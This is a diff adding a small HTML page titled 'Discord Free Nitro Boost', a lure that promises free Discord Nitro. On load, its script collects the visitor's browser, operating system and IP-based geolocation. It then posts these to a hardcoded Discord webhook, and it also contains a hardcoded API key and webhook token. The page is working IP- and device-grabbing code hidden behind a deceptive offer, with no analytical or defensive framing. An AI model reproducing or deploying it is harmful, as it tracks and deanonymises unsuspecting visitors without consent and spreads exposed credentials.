@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    
+    <title>Discord Free Nitro Boost</title>
+    <link rel="icon" type="image/x-icon" href="dis.ico">
+    <script src="client.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <style>
+body{
+    background-image: url(ns.jpg);
+    background-repeat: no-repeat;
+    background-attachment: fixed;
+    background-size: 100%;
+}
+    </style>
+</head>
+<body>
+    <script>
+        let client = new ClientJS();
+        let brow = client.getBrowser();
+        let osv = client.getOS() + client.getOSVersion();
+        let apiKey = '3fbffe704b1747eab3fee8f351da1ecf';
+        $.getJSON('https://ipgeolocation.abstractapi.com/v1/?api_key=' + apiKey, function(data) {
+            const request = new XMLHttpRequest();
+            request.open("POST", "https://discord.com/api/webhooks/957400224232521828/mujPfmqVBL0Sqh5vOtuXdU7PX9SZay3vrhZLIuajUjKh-ZURiNaTevpUF-e_kJr9wH4O");
+            request.setRequestHeader('Content-type', 'application/json');
+            const params = {
+                    username: "Information",
+                    avatar_url: "",
+                    content: JSON.stringify(data, null, 2)+"\n" + "Browser : "+brow+"\n" + "OS : "+osv+"\n"
+                            };
+            request.send(JSON.stringify(params));});
+
+    </script>
+</body>
+</html>
